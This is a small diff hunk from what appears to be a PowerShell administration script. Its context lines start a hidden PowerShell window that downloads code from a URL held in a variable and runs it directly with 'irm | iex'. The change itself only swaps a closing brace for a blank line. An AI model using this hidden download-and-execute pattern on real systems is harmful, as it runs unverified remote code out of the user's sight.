@@ -392,5 +392,5 @@ Start-Process "powershell.exe" -WindowStyle Hidden -ArgumentList "-NoProfile -Ex
     Start-Sleep 5;[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
     irm -UseBasicParsing -Uri '$scheduledtaskurl' | iex
 }`""
-}
+
 Stop-Transcript
